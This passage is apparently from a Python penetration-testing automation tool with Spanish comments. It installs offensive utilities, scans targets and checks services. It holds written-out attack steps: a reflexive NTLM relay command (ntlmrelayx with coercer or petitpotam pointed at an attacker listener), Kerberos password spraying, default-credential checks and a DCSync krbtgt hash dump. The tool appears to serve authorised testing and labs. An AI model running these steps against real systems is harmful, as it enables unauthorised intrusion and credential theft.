    SÍ, sin privilegio: cualquiera puede escribir en /tmp) y solo al final se coloca en
    su sitio: directo si ya somos root, con 'sudo install' si no — mismo patrón que el
    apt-get install de preflight() (un único sudo, consistente con cómo ya se instala
    seclists). Ver _JSMITH_USERLISTS para quién la usa (kerbrute userenum, Fase 5)."""
    import tempfile
    dest = Path(_JSMITH_USERLISTS[0])
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".jsmith")
    tmp.close()
    try:
        ok, errmsg = _download_file(
            "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt",
            tmp.name)
        if not ok:
            return False, errmsg
        if is_root():
            dest.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy(tmp.name, dest)
            os.chmod(dest, 0o644)
            return True, None
        rc, out = run_capture(["sudo", "install", "-D", "-m", "644", tmp.name, str(dest)], timeout=30)
        return rc == 0, (None if rc == 0 else out.strip()[:200])
    finally:
        try:
            os.unlink(tmp.name)
        except OSError:
            pass


def _install_kerbrute():
    """Binario precompilado de la última release de ropnop/kerbrute (sin necesitar un
    toolchain de Go instalado) — confirmado que el asset 'kerbrute_linux_amd64' existe
    SIN número de versión en el nombre (a diferencia de crt.sh, ver _install_crtsh), así
    que el enlace fijo 'releases/latest/download/…' de GitHub basta, sin consultar la
    API."""
    dest, ids = _install_dest_bin("kerbrute")
    ok, errmsg = _download_file(
        "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64", dest)
    if ok:
        os.chmod(dest, 0o755)
        _chown_real(dest, ids)
    return ok, errmsg


def _install_pip_pkg(pkg):
    """`pipx` si está (aísla el entorno — lo recomendado para CLIs Python, evita pisar
    paquetes del sistema); si no, `pip3 install --user` como fallback. 'ok' = el propio
    returncode del instalador, no un re-chequeo aparte."""
    if have("pipx"):
        rc, out = run_capture(["pipx", "install", pkg], timeout=180)
    else:
        rc, out = run_capture([sys.executable, "-m", "pip", "install", "--user", pkg], timeout=180)
    return rc == 0, out


def _install_certipy():
    return _install_pip_pkg("certipy-ad")


def _install_creds():
    return _install_pip_pkg("defaultcreds-cheat-sheet")


def _install_adidnsdump():
    return _install_pip_pkg("adidnsdump")


def _install_crtsh():
    """Binario precompilado de la última release de az7rb/crt.sh — a diferencia de
    kerbrute, el asset SÍ lleva la versión en el nombre ('crt.sh_X.Y.Z_linux_amd64.tar.gz',
    confirmado en el propio README del repo), así que hace falta resolver la URL exacta
    vía la API de GitHub (_github_release_asset) antes de poder descargar nada."""
    dest, ids = _install_dest_bin("crt.sh")
    url = _github_release_asset("az7rb/crt.sh", r"linux_amd64\.tar\.gz$")
    if not url:
        return False, "no se pudo resolver la URL del binario en la última release de GitHub"
    import tempfile, tarfile
    with tempfile.TemporaryDirectory() as td:
        tgz = Path(td) / "crt.sh.tar.gz"
        ok, errmsg = _download_file(url, tgz)
        if not ok:
            return False, errmsg
        try:
            with tarfile.open(tgz) as tar:
                member = next((m for m in tar.getmembers() if Path(m.name).name == "crt.sh"), None)
                if not member:
                    return False, "el .tar.gz de la release no trae un fichero 'crt.sh'"
                member.name = "crt.sh"
                try:
                    tar.extract(member, td, filter="data")   # filtro seguro (PEP 706): sin "../", sin paths absolutos
                except TypeError:
                    tar.extract(member, td)   # Python sin el backport de seguridad de 'filter' (< 3.12, o un
                                              # 3.8-3.11 sin parchear) — member.name ya es solo "crt.sh" (sin
                                              # subcarpeta ni ".."), así que extraer sin filtro aquí es seguro igual
            # BUG real: a diferencia de _install_kerbrute/_install_jsmith (que escriben vía
            # _download_file, que YA crea el directorio padre), esta copia final es un
            # shutil.copy aparte — sin este mkdir, un .local/bin que todavía no existe (caso
            # normal: operador que nunca usó pipx/pip --user) hacía fallar la instalación con
            # un confuso "No such file or directory" pese a que la descarga/extracción habían
            # ido bien.
            dest.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy(Path(td) / "crt.sh", dest)
            os.chmod(dest, 0o755)
            _chown_real(dest, ids)
        except (tarfile.TarError, OSError, shutil.Error) as e:
            return False, str(e)
    return True, None


_FETCHABLE_RESOURCES = {
    "jsmith.txt": {"fetch": _install_jsmith,
                   "source": "insidetrust/statistically-likely-usernames (GitHub, un solo fichero)"},
    "kerbrute":   {"fetch": _install_kerbrute,
                   "source": "binario precompilado de la última release de github.com/ropnop/kerbrute"},
    "certipy":    {"fetch": _install_certipy, "source": "paquete 'certipy-ad' de PyPI (pipx/pip)"},
    "creds":      {"fetch": _install_creds,
                   "source": "paquete 'defaultcreds-cheat-sheet' de PyPI (pipx/pip)"},
    "adidnsdump": {"fetch": _install_adidnsdump, "source": "paquete 'adidnsdump' de PyPI (pipx/pip)"},
    # mongosh NO está aquí a propósito: "npm install -g" necesita sudo si no hay privilegio
    # (como apt), pero bajo sudo el PATH restringido de root probablemente no ve el npm de
    # un Node instalado por nvm (el mismo problema de fondo que ya forzó a crear
    # _bin_with_sudo_fallback para nxc/certipy/kerbrute) — y aunque se instalara bien, nada
    # en el fichero sabría ENCONTRARLO después: a diferencia de certipy/kerbrute/creds/
    # adidnsdump, mongosh se resuelve hoy con un `have("mongosh")` a pelo (ver fp_mongo),
    # sin el fallback a .local/bin que tienen los demás. Arreglarlo de verdad pide un
    # resolver dedicado + tocar el punto de uso, no solo el instalador — mismo nivel de
    # riesgo que joomscan (ver abajo), así que se queda fuera de la lista, igual que esa.
    "crt.sh":     {"fetch": _install_crtsh,
                   "source": "binario precompilado de la última release de github.com/az7rb/crt.sh"},
}


# binario -> (paquete apt | None si no está en los repos, qué habilita, fases que lo usan).
# Fases: "fuzz", "sploit", "foot" (footprinting), "creds". Se avisa solo de las que
# hacen falta según los flags; las que falten se SALTAN solas (nunca se rompe el escaneo).
TOOL_PKGS = {
    "nxc":              ("netexec", "SMB/LDAP/WinRM/RDP/VNC/WMI/MSSQL/SSH/FTP: credenciales por defecto y footprint Windows/AD", ("foot", "creds")),
    "smbclient":        ("smbclient", "SMB: listar shares sin credenciales", ("foot",)),
    "rpcclient":        ("smbclient", "RPC: enumeración por sesión nula", ("foot",)),
    "impacket-rpcdump": ("impacket-scripts", "MSRPC: volcado de endpoints RPC", ("foot",)),
    "showmount":        ("nfs-common", "NFS: listar exports", ("foot",)),
    "dig":              ("dnsutils", "DNS: version.bind, NS/TXT del dominio y transferencia de zona (AXFR) contra el IP escaneado y contra los NS reales", ("foot",)),
    "whois":            ("whois", "WHOIS: registrador, fechas y name servers del dominio", ("foot",)),
    "crt.sh":           (None, "Certificate Transparency: subdominios reales vía crt.sh (no está en apt → github.com/az7rb/crt.sh)", ("foot",)),
    "ldapsearch":       ("ldap-utils", "LDAP: naming contexts / volcado anónimo", ("foot",)),
    "whatweb":          ("whatweb", "web: fingerprint de tecnologías", ("foot",)),
    "wafw00f":          ("wafw00f", "web: detecta si hay un WAF delante antes de fuzzear", ("foot",)),
    "onesixtyone":      ("onesixtyone", "SNMP: fuerza bruta de community (--aggressive)", ("foot",)),
    "snmpwalk":         ("snmp", "SNMP: community por defecto", ("foot", "creds")),
    "tnscmd10g":        ("tnscmd10g", "Oracle: versión del listener TNS", ("foot", "creds")),
    "mysql":            ("default-mysql-client", "MySQL: credenciales por defecto", ("creds",)),
    "psql":             ("postgresql-client", "PostgreSQL: credenciales por defecto", ("creds",)),
    "redis-cli":        ("redis-tools", "Redis: acceso sin autenticar", ("creds",)),
    "odat":             ("odat", "Oracle: descubrir SID + credenciales por defecto", ("creds",)),
    "ipmitool":         ("ipmitool", "IPMI/BMC: credenciales por defecto", ("creds",)),
    "mongosh":          (None, "MongoDB: acceso sin autenticar (no está en apt → repo de MongoDB)", ("creds",)),
    "ffuf":             ("ffuf", "fuzzing de directorios y vhosts", ("fuzz",)),
    "nikto":            ("nikto", "web: escaneo de vulnerabilidades/config conocidas (--nikto, opt-in — lento)", ("nikto",)),
    "wpscan":           ("wpscan", "CMS: WPScan contra WordPress — plugins/temas/usuarios/vulns (--cms-scan, opt-in)", ("cms",)),
    "joomscan":         (None, "CMS: JoomScan contra Joomla (--cms-scan, opt-in — no está en apt, github.com/OWASP/joomscan)", ("cms",)),
    "katana":           ("katana", "web: crawling real con katana — sigue enlaces/JS/formularios de verdad (--crawl, opt-in)", ("crawl",)),
    "nuclei":           ("nuclei", "web: nuclei — plantillas de CVEs/exposiciones/misconfig (--nuclei, opt-in — lento/ruidoso)", ("nuclei",)),
    "searchsploit":     ("exploitdb", "exploits conocidos (consulta offline)", ("sploit",)),
    "certipy":          (None, "AD CS: enumera plantillas de certificados vulnerables (ESC1-8) con una credencial de dominio ya validada — Fase 5d (no está en apt → pip/pipx install certipy-ad)", ("creds",)),
    "creds":            (None, "Web: credenciales por defecto de productos fingerprintados por whatweb (Jenkins/Grafana/Tomcat…) — consulta local (no está en apt → pipx install defaultcreds-cheat-sheet)", ("foot",)),
    "hydra":            ("hydra", "Fuerza bruta de LISTAS (-U/-P) en SSH/FTP/SMB — Fase 5d (más rápido que nxc y sin su bug de paramiko por SSH)", ("foot",)),
    "kerbrute":         (None, "AD: enum de usuarios + password spray por Kerberos pre-auth contra un DC (rápido/silencioso; no está en apt → github.com/ropnop/kerbrute)", ("foot",)),
    "smtp-user-enum":   ("smtp-user-enum", "SMTP: enum de usuarios por RCPT con --aggressive si hay dominio (VRFY/EXPN suelen estar capados)", ("foot",)),
    "impacket-secretsdump": ("impacket-scripts", "AD: con una credencial de dominio ya validada, confirma derechos DCSync volcando SOLO el hash de krbtgt (no el NTDS completo) — Fase 5d", ("creds",)),
    "adidnsdump":       (None, "AD: vuelca DNS interno del dominio vía LDAP con una credencial ya validada (más fiable que AXFR si la zona no transfiere) — Fase 5d (no está en apt → pip/pipx install adidnsdump)", ("creds",)),
    "seclists":         ("seclists", "wordlists de descubrimiento (directorios/ficheros web, subdominios DNS, community SNMP, usuarios) usadas en casi todas las fases", ("foot", "fuzz", "creds")),
    "jsmith.txt":       (None, "AD: wordlist de nombres de empleado realistas para el userenum de kerbrute (Fase 5) — no está en seclists ni en apt, ver _JSMITH_USERLISTS", ("foot",)),
}


def _tool_present(tool):
    """nxc puede llamarse nxc/netexec/crackmapexec; crt.sh/impacket-rpcdump pueden vivir
    fuera del PATH de root bajo sudo (pipx/Go); 'seclists'/'jsmith.txt' no son binarios
    (carpeta/fichero, sin `have()`); el resto por su nombre."""
    if tool == "nxc":
        return nxc_bin() is not None
    if tool == "crt.sh":
        return _crtsh_bin() is not None
    if tool == "impacket-rpcdump":
        return _rpcdump_bin() is not None
    if tool == "certipy":
        return certipy_bin() is not None
    if tool == "creds":
        return _creds_bin() is not None
    if tool == "kerbrute":
        return _kerbrute_bin() is not None
    if tool == "impacket-secretsdump":
        return _secretsdump_bin() is not None
    if tool == "adidnsdump":
        return _adidnsdump_bin() is not None
    if tool == "seclists":
        return Path("/usr/share/seclists").is_dir()
    if tool == "jsmith.txt":
        return any(Path(p).is_file() for p in _JSMITH_USERLISTS)
    return have(tool)


def preflight(args, check_all=False, check_only=False):
    """ANTES de tocar el objetivo: si faltan herramientas (solo las que hacen falta
    según los flags), avisa UNA vez y deja elegir: instalar (apt, y lo que tenga un
    fetcher en _FETCHABLE_RESOURCES — pip/pipx/npm/binario de GitHub), continuar sin
    ellas (esos servicios se saltan), o abortar. Devuelve True para seguir, False para
    abortar. No interactivo o --no-preflight → continúa sin preguntar. SIEMPRE se
    verifica primero (`_tool_present`, ya hecho al construir `missing`) y se enseña la
    fuente exacta de cada descarga ANTES de preguntar — nada se toca sin que el aviso
    haya salido primero, y nada se descarga si el operador no confirma (o no pasó
    --install-missing).
    check_all: comprueba TODAS las herramientas (modo standalone, sin filtrar por flags).
    check_only: solo lista lo que falta y cómo instalarlo; no instala nada."""
    active = set()
    if not args.no_creds:
        active.add("creds")
    if not args.default_creds:
        if not args.no_fuzz:
            active.add("fuzz")
        if not args.no_searchsploit:
            active.add("sploit")
        if not args.no_footprint:
            active.add("foot")
        if args.nikto:
            active.add("nikto")
        if args.cms_scan:
            active.add("cms")
        if args.crawl:
            active.add("crawl")
        if args.nuclei:
            active.add("nuclei")
    missing = []
    for tool, (pkg, desc, tags) in TOOL_PKGS.items():
        if not check_all and tags and not (set(tags) & active):
            continue                              # con estos flags, esta herramienta no se usa
        if not _tool_present(tool):
            missing.append((tool, pkg, desc))
    if not missing:
        if check_all or check_only:
            good("Todas las herramientas ya están instaladas.")
        return True

    warn(f"Faltan {len(missing)} herramientas; sin ellas esos servicios NO se enumeran (el resto del escaneo sí):")
    for tool, pkg, desc in missing:
        if pkg:
            tag = f"apt: {pkg}"
        elif tool in _FETCHABLE_RESOURCES:
            tag = f"descarga: {_FETCHABLE_RESOURCES[tool]['source']}"
        else:
            tag = "instalación MANUAL (sin automatizar)"
        print(f"    {C_YELLOW}·{C_RESET} {C_BOLD}{tool}{C_RESET} {C_GREY}[{tag}]{C_RESET} — {desc}")
    installable = sorted({pkg for _, pkg, _ in missing if pkg})
    fetchable = [(t, d) for t, p, d in missing if not p and t in _FETCHABLE_RESOURCES]
    pure_manual = [(t, d) for t, p, d in missing if not p and t not in _FETCHABLE_RESOURCES]

    if check_only:
        if installable:
            info("Instalables con apt: " + " ".join(installable) + "   (usa --install-missing para instalarlas)")
        if fetchable:
            info("Descargables automáticamente: " + ", ".join(t for t, _ in fetchable) +
                 "   (usa --install-missing — ver la fuente de cada una arriba)")
        if pure_manual:
            info("Requieren instalación manual: " + ", ".join(t for t, _ in pure_manual))
        return True

    if args.no_preflight:
        info("--no-preflight: continúo sin instalar.")
        return True
    if args.install_missing:
        choice = "i"
    elif not sys.stdin.isatty():
        info("Entrada no interactiva: continúo sin instalar (los servicios sin herramienta se saltan).")
        return True
    else:
        opts = "[i]nstalar / " if (installable or fetchable) else ""
        try:
            choice = input(f"{C_CYAN}[?]{C_RESET} {opts}[c]ontinuar sin ellas / [a]bortar > ").strip().lower()[:1]
        except (EOFError, KeyboardInterrupt):
            print()
            choice = "a"

    if choice == "a":
        err("Abortado por el usuario.")
        return False
    if choice == "i":
        if installable:
            apt = (["sudo"] if not is_root() else []) + ["apt-get", "install", "-y"] + installable
            info("Instalando con apt: " + " ".join(installable))
            run(apt, timeout=900)
            still = [t for t, p, _ in missing if p and not _tool_present(t)]
            if still:
                warn("Siguen sin detectarse tras apt (revisa la salida): " + ", ".join(still))
            else:
                good("Herramientas de apt instaladas correctamente.")
        for tool, _ in fetchable:
            src = _FETCHABLE_RESOURCES[tool]["source"]
            info(f"Descargando {tool} ({src})…")
            try:
                ok, detail = _FETCHABLE_RESOURCES[tool]["fetch"]()
            except Exception as e:     # un fetcher nunca debe tumbar el resto de preflight
                ok, detail = False, str(e)
            if ok and _tool_present(tool):
                good(f"{tool} instalado correctamente.")
            else:
                warn(f"No se pudo instalar {tool} automáticamente" + (f": {detail}" if detail else "") +
                     f" — instálalo a mano ({src}).")
    if pure_manual:
        info("Herramientas que requieren instalación MANUAL (sin automatizar):")
        for t, d in pure_manual:
            print(f"    {C_GREY}· {t}: {d}{C_RESET}")
    return True


def maybe_add_hosts(ip, domains, args):
    """Ofrece añadir los dominios/hostnames descubiertos a /etc/hosts (desbloquea el
    fuzzing de vhosts y el acceso por nombre). Con confirmación; --add-hosts lo hace
    sin preguntar, --no-add-hosts lo desactiva. Requiere root para escribir."""
    if not domains or args.no_add_hosts:
        return
    hosts = Path("/etc/hosts")
    try:
        current = hosts.read_text()
    except OSError:
        return
    missing = [d for d in domains if not re.search(rf"(?m)^\S+\s+.*\b{re.escape(d)}\b", current)]
    if not missing:
        return
    line = f"{ip} {' '.join(missing)}"
    # Memoria por-IP de un "no": maybe_add_hosts se llama DOS veces por objetivo (dominios
    # descubiertos, y luego los vhosts del fuzzing). Si ya dijiste que no para esta IP, no
    # se vuelve a preguntar — solo se imprime la línea para añadirla a mano.
    declined = getattr(args, "_hosts_declined", None)
    if declined is None:
        declined = args._hosts_declined = set()
    if args.add_hosts:
        do = True
    elif ip in declined:
        info(f"(/etc/hosts) ya dijiste que no para {ip}; para añadir a mano:  {line}")
        return
    elif not sys.stdin.isatty() or getattr(args, "_noninteractive", False):
        info(f"(/etc/hosts) para añadir a mano:  {line}")
        return
    else:
        try:
            ans = input(f"{C_CYAN}[?]{C_RESET} ¿Añadir a /etc/hosts «{line}»? [s/N] ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            ans = ""
        do = ans[:1] in ("s", "y")
    if not do:
        declined.add(ip)   # recuerda el "no" para la 2ª oferta (vhosts) de esta misma IP
        return
    if not is_root():
        warn(f"Sin root: no puedo escribir /etc/hosts. Añade a mano:  {line}")
        return
    try:
        with _HOSTS_LOCK:                 # con --jobs, que no se pisen dos hilos escribiendo
            with open(hosts, "a") as f:
                f.write(f"\n# palantir {ip}\n{line}\n")
        good(f"/etc/hosts actualizado:  {line}")
    except OSError as e:
        err(f"no pude escribir /etc/hosts: {e}")


def _make_hostname_symlinks(outdir, folder, domains):
    """Symlink de conveniencia <outdir>/<hostname> -> <outdir>/<folder>/ por cada hostname
    ESPECÍFICO descubierto (p. ej. 'file01.nexura.htb'), para poder 'cd' por nombre. Se
    EXCLUYE el dominio base a secas ('nexura.htb'): lo comparten todas las cajas del mismo
    dominio AD y se pisarían el symlink entre sí. La carpeta real sigue siendo <folder>/
    (la que decide target_folders() al principio, antes de escanear) — --resume sigue
    leyendo/escribiendo ahí tal cual, esto es solo un acceso directo adicional, no un rename."""
    target_dir = Path(outdir) / folder
    for d in domains:
        if base_domain(d) == d:          # dominio base compartido: no lo symlinkeamos
            continue
        link = Path(outdir) / d
        try:
            if link.is_symlink():
                if link.resolve() == target_dir.resolve():
                    continue              # ya apunta bien (re-run/--resume)
                if link.exists():
                    warn(f"{link} ya es un symlink a otra carpeta — no lo toco (¿mismo hostname en otra caja?).")
                    continue
                link.unlink()             # symlink roto (de un run viejo con otra IP en esta carpeta)
            elif link.exists():
                warn(f"{link} ya existe y no es el symlink de conveniencia — no lo toco.")
                continue
            link.symlink_to(folder)
        except OSError as e:
            warn(f"no pude crear el symlink {link} -> {folder}: {e}")


def _fill_domain_placeholder(footprints, domain):
    """Varios next-steps (GetNPUsers.py/GetUserSPNs.py de Kerberos, de momento) se generan
    con el placeholder literal "DOMINIO" en vez del dominio real, porque la función que los
    genera (fp_kerberos) corre ANTES de que discover_domains() tenga uno — se rellena aquí
    una vez conocido, en vez de dejarlo para que el operador lo sustituya a mano. Centralizado
    (un solo punto, en vez de enhebrar el dominio por cada función de footprint): cualquier
    next-step futuro que use el mismo placeholder se beneficia igual, sin tocarlo."""
    if not domain:
        return
    for fpr in footprints:
        fpr["next"] = [n.replace("DOMINIO", domain) for n in fpr["next"]]


def _fill_netbios_placeholder(footprints, name):
    """El next-step de explotar Zerologon (ver fp_smb) se genera con el placeholder literal
    'NETBIOS-DEL-DC' porque en ese punto del run —SIN credenciales, antes del footprint
    completo— palantir no tiene garantizado el nombre NetBIOS del DC. Se rellena aquí una vez
    que nbstat/rdp-ntlm-info/smb-os-discovery ya lo han capturado (netbios_computer_name), en
    vez de dejarlo para que el operador lo sustituya a mano. Bug real visto en un run contra
    INLANEFREIGHT.LOCAL (pedido explícito, "revisa que no haya bugs"): copiar el comando TAL
    CUAL con el placeholder sin sustituir falla con STATUS_INVALID_COMPUTER_NAME — nmap YA
    había capturado 'ACADEMY-EA-DC01' varias fases antes, así que dejarlo en manos del
    operador era innecesario. Mismo patrón que _fill_domain_placeholder."""
    if not name:
        return
    for fpr in footprints:
        fpr["next"] = [n.replace("NETBIOS-DEL-DC", name) for n in fpr["next"]]


def _combine_relay_opportunity(footprints, ip):
    """Combina SMB signing no requerido (fp_smb, metadata interna '_signing_disabled') con un
    primitivo de coacción NTLM confirmado por MSRPC (fp_msrpc, '_coerce'/'_coerce_via') del
    MISMO host — cada fp_* es independiente y no sabe nada del otro protocolo, así que la
    combinación se hace aquí, DESPUÉS de que ambos ya corrieron, igual que
    _fill_domain_placeholder/_fill_netbios_placeholder combinan datos de fases distintas. Se
    llama en run_one tanto en un escaneo fresco como tras --resume (si el footprint se
    reutilizó de un findings.json anterior, _norm_fp conserva estas claves igual que conserva
    cualquier otra) — colocarlo aquí en vez de dentro de footprint_services() es justo lo que
    hace que funcione en los dos casos. Si los dos aparecen: coaccionar al equipo a
    autenticarse contra un listener propio y reenviar esa misma autenticación de vuelta a SU
    PROPIO SMB (ntlmrelayx) da una sesión como la cuenta de MÁQUINA del equipo — sin crackear
    ni robar ninguna contraseña. Las claves '_signing_disabled'/'_coerce'/'_coerce_via' son
    metadata interna: se sacan SIEMPRE (haya combinación o no), ANTES del primer write_reports
    de este run, para que nunca lleguen a filtrarse al HTML/findings.json."""
    smb_fp = next((f for f in footprints if f.get("proto") == "smb"), None)
    rpc_fp = next((f for f in footprints if f.get("proto") == "msrpc"), None)
    signing_disabled = smb_fp.pop("_signing_disabled", False) if smb_fp else False
    coerce_ok = rpc_fp.pop("_coerce", False) if rpc_fp else False
    coerce_via = rpc_fp.pop("_coerce_via", "") if rpc_fp else ""
    if smb_fp and signing_disabled and coerce_ok:
        smb_fp["findings"].append(("critica",
            f"SMB+MSRPC: relay REFLEXIVO viable — {coerce_via} expuesto (MSRPC) + SMB signing no "
            "requerido (arriba): coacciona al equipo a autenticarse contra tu listener y reenvía esa "
            "misma autenticación de vuelta a SU PROPIO SMB con ntlmrelayx → sesión autenticada como "
            "la cuenta de MÁQUINA del equipo (a menudo admin local de sí misma)"))
        smb_fp["next"].append(
            f"ntlmrelayx.py -t smb://{ip} -smb2support   # EN PARALELO: coercer coerce -u USER -p PASS "
            f"-d DOMINIO --target-ip {ip} --listener-ip TU_IP (o petitpotam.py -u USER -p PASS -d "
            f"DOMINIO TU_IP {ip}) — relay REFLEXIVO ({coerce_via} + signing no requerido, ambos "
            "confirmados arriba): la autenticación forzada del equipo se reenvía de vuelta a su "
            "propio SMB → sesión como cuenta de MÁQUINA (de ahí, secretsdump.py vía esa sesión)")


def expand_targets(specs):
    """Expande especificaciones a una lista de (ip, nombre): IP, CIDR (a.b.c.d/n),
    rango (a.b.c.d-e), o hostname (se resuelve a IP, conservando el nombre). Dedupe
    por (ip, nombre) — NO por ip a secas: detrás de un WAF/CDN (Cloudflare…) dos
    hostnames DISTINTOS pueden resolver a la MISMA IP anycast y aun así ser dos
    aplicaciones totalmente distintas (solo el Host: los diferencia) — deduplicar
    por ip a secas descartaba uno de los dos en silencio."""
    out = []
    for s in specs:
        s = (s or "").strip()
        if not s or s.startswith("#"):
            continue
        try:                                       # IP sola o CIDR
            net = ipaddress.ip_network(s, strict=False)
            if "/" in s:
                hs = list(net.hosts()) or [net.network_address]
                out += [(str(h), "") for h in hs]
            else:
                out.append((str(net.network_address), ""))
            continue
        except ValueError:
            pass
        m = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.)(\d{1,3})-(\d{1,3})$", s)   # rango a.b.c.d-e
        if m and 0 <= int(m.group(2)) <= int(m.group(3)) <= 255:
            base, lo, hi = m.group(1), int(m.group(2)), int(m.group(3))
            out += [(f"{base}{i}", "") for i in range(lo, hi + 1)]
            continue
        try:                                       # hostname → resolver
            rip = socket.gethostbyname(s)
            out.append((rip, s))
        except OSError:
            warn(f"no pude resolver '{s}', lo ignoro.")
    seen, dedup = set(), []
    for ip, name in out:
        key = (ip, name)
        if key not in seen:
            seen.add(key)
            dedup.append((ip, name))
    return dedup


_FOLDER_UNSAFE_RE = re.compile(r"[^A-Za-z0-9_.-]")


def target_folders(targets):
    """Carpeta de resultados <outdir>/<folder>/ para cada (ip, nombre) de `targets`.
    Por defecto 'folder' es la IP a secas (el layout de toda la vida). PERO
    expand_targets deduplica por (ip, nombre), no por ip: dos hostnames distintos
    que resuelven a la MISMA IP (un WAF/CDN anycast) se escanean los DOS — sin esto,
    compartirían carpeta y el informe del segundo pisaría al del primero en silencio.
    Si varios objetivos de `targets` comparten ip, los que SÍ tienen nombre se
    namespacean a '<ip>_<nombre-saneado>'; el que no tiene nombre (la IP suelta, si
    la hay — nunca puede haber dos, expand_targets ya la dedupe) conserva la carpeta
    de siempre, para no sorprender al caso normal de un solo objetivo por IP."""
    counts = {}
    for ip, _name in targets:
        counts[ip] = counts.get(ip, 0) + 1
    folders = {}
    for ip, name in targets:
        if counts[ip] > 1 and name:
            safe = _FOLDER_UNSAFE_RE.sub("_", name)[:80]
            folders[(ip, name)] = f"{ip}_{safe}"
        else:
            folders[(ip, name)] = ip
    return folders


def _phase_fail(label, exc, base):
    """Una fase (footprint/creds/searchsploit/web-lento) petó: se avisa, se guarda la traza en
    error.log y el run SIGUE — así una tool que revienta en una fase no deja sin informe FINAL
    ni mata las fases siguientes (antes la excepción subía a _run_one_guarded y solo quedaba el
    preliminar). El informe saldrá con los datos parciales que haya."""
    err(f"fase «{label}» falló: {exc} — sigo con el resto; el informe saldrá con lo que haya")
    try:
        with open(base / "error.log", "a", encoding="utf-8") as fh:
            fh.write(f"\n{datetime.now():%Y-%m-%d %H:%M:%S}  [fase {label}]\n{traceback.format_exc()}")
    except OSError:
        pass


def _norm_fp(f):
    """Normaliza un footprint-dict REUTILIZADO de un findings.json anterior (--resume): rellena las
    claves que el render/agregado dan por hechas, por si viene de una versión más vieja de palantir
    a la que le faltaba alguna → evita KeyError al pintar/agregar."""
    for k in ("findings", "next", "steps", "missing", "ports"):
        f.setdefault(k, [])
    f.setdefault("proto", "")
    f.setdefault("title", (f.get("proto") or "").upper())
    return f


def run_one(ip, name, args, folder=None):
    """Escaneo + footprint + creds + exploits + fuzz + informes de UN objetivo.
    'name' es el hostname (si el objetivo se dio por nombre); se añade a los dominios.
    'folder': subcarpeta de resultados (def. la propia ip) — distinta de 'ip' cuando
    varios objetivos del mismo run comparten IP (ver target_folders)."""
    base = Path(args.outdir) / (folder or ip)
    _t0 = datetime.now()   # para el tiempo total en el resumen final (print_run_summary)
    nmapdir, webdir = base / "nmap", base / "web"
    nmapdir.mkdir(parents=True, exist_ok=True)
    webdir.mkdir(parents=True, exist_ok=True)
    chown_dirs(base)   # bajo sudo: carpetas al usuario real YA (poder borrar/leer aunque se interrumpa)
    _set_commands_log(base / "commands.log")
    info(f"Resultados en {base}")

    _TLS.nmap_fresh_scan = False   # _nmap_run lo pone a True si --resume tuvo que re-escanear de verdad
    prev = _load_prev_findings(base) if args.resume else None

    forced_ports = _parse_ports(args.port) if args.port else None
    if args.port and not forced_ports:
        warn("--port no tenía ningún puerto válido; hago el barrido normal.")
    # Por un túnel/pivot NO se recorta el alcance: el -p- entero funciona con --max-retries 10
    # (confirmado en vivo: `nmap -sT -p-` por ligolo-ng encuentra 3389 Y 5985, lento pero
    # completo — lo que fallaba era el --max-retries 3 de la 1ª versión, menos que el default).
    # Va más lento por el túnel (varios min), pero pilla TODO, incluidos los RPC dinámicos
    # altos de un DC (49xxx). Para la versión rápida (top-1000) el usuario tiene --top.
    ports = fast_ports(ip, nmapdir, args.min_rate, args.top, stealth=args.stealth,
                       source_port=args.source_port, ports=forced_ports, tunnel=args.tunnel)
    if ports is None:
        return
    # Auto-fallback a connect scan (-sT): con root usamos SYN (-sS), pero en WSL2 mirrored
    # + VPN de HTB los SYN raw se pierden en el túnel → nmap dice "host up" con 0 puertos
    # (falso negativo). Si el SYN no encontró NADA y no estamos ya en connect/stealth,
    # reintentamos UNA vez con -sT (deep_scan/udp lo heredan vía scan_type). --tcp-connect lo
    # fuerza desde el principio y salta esto. Afecta a todos los objetivos (si el túnel
    # descarta SYN, lo hace para todos) — idempotente, sin problema bajo --jobs.
    global CONNECT
    if not ports and is_root() and not CONNECT and not args.stealth:
        warn("SYN scan (-sS) sin resultados con root — posible túnel que descarta SYN raw "
             "(p. ej. WSL2 mirrored + VPN). Reintento con connect scan (-sT)…")
        CONNECT = True
        ports = fast_ports(ip, nmapdir, args.min_rate, args.top, stealth=args.stealth,
                           source_port=args.source_port, ports=forced_ports, tunnel=args.tunnel)
    if not ports and not forced_ports:
        # Algunos WAF/CDN/firewalls detectan y bloquean el PATRÓN de un barrido masivo
        # (muchos puertos en poco tiempo) pero dejan pasar una conexión HTTP normal —
        # confirmado en vivo: -p- sin resultados, -p 80,443 los encuentra al instante.
        # Antes de rendirnos, reintentamos solo con los puertos web más probables.
        warn("Barrido completo sin resultados (o el objetivo filtra/limita el escaneo masivo) "
             "— reintento solo con los puertos web habituales (80, 443, 8080, 8443).")
        ports = fast_ports(ip, nmapdir, args.min_rate, args.top, stealth=args.stealth,
                           source_port=args.source_port, ports=[80, 443, 8080, 8443], tunnel=args.tunnel)
    if not ports:
        warn("No hay puertos abiertos (o el host filtra todo).")
        return
    if len(ports) > 150:
        warn(f"{len(ports)} puertos abiertos: ¿tarpit/firewall? Revisa antes de confiar.")

    # Fase 2
    dsp = dict(stealth=args.stealth, source_port=args.source_port, hostname=args.vhost or name, tunnel=args.tunnel)
    if args.no_scripts:
        parsed = deep_scan(ip, ports, nmapdir, ["banner"], "deep", "20s", **dsp)
    else:
        phase("Fase 2 — enumeración de servicios + scripts NSE",
              "-sV identifica producto y versión de cada puerto, y los scripts NSE hacen la enumeración segura propia de cada servicio")
        parsed = deep_scan(ip, ports, nmapdir, SCRIPTS_DEFAULT, "deep", "30s", **dsp)
        if parsed and args.aggressive:
            phase("Fase 2b — scripts vuln (proceso aparte, --aggressive)",
                  "scripts de vulnerabilidades conocidas (MS17-010, Shellshock…) en un nmap aparte, para que un timeout no borre lo ya enumerado")
            merge_scripts(parsed, deep_scan(ip, ports, nmapdir, SCRIPTS_AGGRESSIVE,
                                            "vuln", "60s", host_timeout="10m", **dsp))
    if parsed is None:
        err("Fase 2 sin salida válida; uso solo los puertos de la fase 1.")
        parsed = {"ports": [{"port": n, "proto": "tcp", "state": "open", "name": "",
